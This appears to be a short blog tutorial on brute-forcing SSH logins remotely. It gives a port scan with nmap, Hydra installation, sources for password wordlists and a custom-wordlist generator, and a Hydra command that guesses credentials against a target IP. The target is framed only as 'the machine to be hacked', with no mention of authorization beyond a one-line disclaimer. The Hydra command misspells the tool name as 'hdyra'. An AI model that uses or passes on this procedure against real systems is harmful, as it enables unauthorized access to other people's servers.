---
layout: post
tittle: How to Hack ssh Login Remotely
categories: Hacking
---

- My OS Info: Ubuntu18.04 LTS Server

## Hacking Software
[Hydra](https://github.com/vanhauser-thc/thc-hydra)

Hydra is a open source brute and forcing  password hacking tool.

## Step 1 Scan the Listening Ports
Use `nmap` command to scan the ports that your machine to be hacked is listening to.

`nmap YOUR_HACKING_Machine_IP_ADDRESS`

which will show like this

```
Host is up (0.0028s latency).
Not shown: 989 closed ports
PORT      STATE    SERVICE
22/tcp    filtered ssh
80/tcp    open     http
139/tcp   open     netbios-ssn
443/tcp   open     https
445/tcp   open     microsoft-ds
548/tcp   open     afp
3306/tcp  open     mysql
3689/tcp  open     rendezvous
8181/tcp  open     intermapper
9000/tcp  open     cslistener
49154/tcp open     unknown

```

## Step 2 Install Hacking Software
`sudo apt install hydra`

## Step 3 Prepare user file and password file
- user.txt -> A dictionary which contains all the username to try
- passwd.txt -> A dictionary which contains all the password to try

You may want to download password dictionary from following site:

[https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm](https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm)

Or custom a wordlist on your own:

[https://null-byte.wonderhowto.com/how-to/create-custom-wordlists-for-password-cracking-using-mentalist-0183992/](https://null-byte.wonderhowto.com/how-to/create-custom-wordlists-for-password-cracking-using-mentalist-0183992/)

If the dictionary file is too large, you may split it using command `split` to divide the large file to small ones.

## Step 4 Run Hydra to Hack
`hdyra -L user.txt -P passwd.txt ssh://YOUR_HACKING_Machine_IP_ADDRESS -t 4`

`-t 4` means hydra starts 4 thread to hack the password.

## Attention:
- Please do not use in military or secret service organizations, or for illegal purposes;

- If you don't know useful information about the machine to be hacked, it may takes years to hack out the password, which depends on your computing power and dictionary size. It is practical to use the information you know about the machine to be hacked to generate custom wordlist,  you may using tool like [cupp](https://github.com/Mebus/cupp).

## References
[https://null-byte.wonderhowto.com/how-to/gain-ssh-access-servers-by-brute-forcing-credentials-0194263/](https://null-byte.wonderhowto.com/how-to/gain-ssh-access-servers-by-brute-forcing-credentials-0194263/)

[https://linoxide.com/linux-how-to/split-large-text-file-smaller-files-linux/](https://linoxide.com/linux-how-to/split-large-text-file-smaller-files-linux/)
